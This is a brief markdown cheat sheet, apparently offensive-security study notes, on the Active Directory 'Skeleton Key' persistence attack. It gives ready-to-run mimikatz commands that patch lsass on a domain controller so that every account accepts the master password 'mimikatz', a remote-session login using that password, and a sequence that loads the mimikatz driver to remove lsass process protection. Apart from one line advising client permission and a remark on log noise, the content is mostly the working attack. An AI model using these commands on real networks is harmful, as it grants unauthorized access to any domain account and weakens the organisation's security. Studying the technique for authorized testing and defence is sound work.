# Skeleton Key

* skeleton key is a persistence technique where it is possible to patch a DC (lsass process) so that it allows access as any user which a single password
* all the publicly known methods are not persistent across reboots
* mimikatz to assist

* inject a skeleton key (password: mimikatz) on a DC of choice. DA privs required
```powershell
Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"' -Computername dc.sub.domain.local
```

* now it is possible to access any machine with a valid username and password as "mimikatz"
```powershell
Enter-PSSession -Computername dc -credential dc\Administrator
```

* you can access other machines as well as long as they authenticate with the DC which has been patched and the DC is not rebooted.


NOTE: before attempting this attack in real life, first get permission from client / stake holders as this as downgrade their security and put them at risk to other unknown threats in the network.

* in case lsass is running as a protected process, we can still use skeleton key but it needs the mimikatz driver (mimidriv.sys) on disk of the target DC.
```
mimikatz# privilege::debug
mimikatz# !+
mimikatz# !processprotect /process:lsass.exe /remove
mimikatz# misc::skeleton
mimikatz# !-
```
* note the above would be very noise in logs - service installation (kernel mode driver)












